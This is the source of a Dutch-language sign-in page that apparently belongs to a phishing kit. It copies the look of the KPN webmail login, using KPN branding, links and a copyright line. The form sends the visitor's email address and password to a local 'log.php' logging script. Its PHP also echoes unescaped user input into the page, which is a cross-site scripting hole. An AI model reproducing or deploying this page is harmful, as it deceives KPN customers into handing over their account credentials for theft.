﻿﻿﻿<html>
<head>
<title>Aanmelden</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="images/kpnmail/favicon.ico" rel="shortcut icon">
</head>
<body >
	<div id="container">
		<div class="logo">
			<img src="data:image/png;base64,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">
               
			<div class="header-wrapper">
				<h2 class="header-text">Aanmelden</h2>
				
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="E-mailadres" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Wachtwoord" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Aangemeld blijven</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Aanmelden" class="default">
					</div>
					<div class="input-fields forgot">
						<h3>Waarmee kunnen we je helpen?</h3>
                  <ul class="links-left">
                     <li>
                        <a href="https://www.kpn.com/service/internet/e-mail/wachtwoord-of-gebruikersnaam-vergeten.htm" target="_blank">
                           Wachtwoord vergeten
                        </a>
                     </li>
                     <li>
                        <a href="https://www.kpn.com/service/internet/e-mail.htm" target="_blank">
                           Kpn Corporation Copyright © 2019.
                        </a>
                     </li>
                     
                       
                   
                    
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>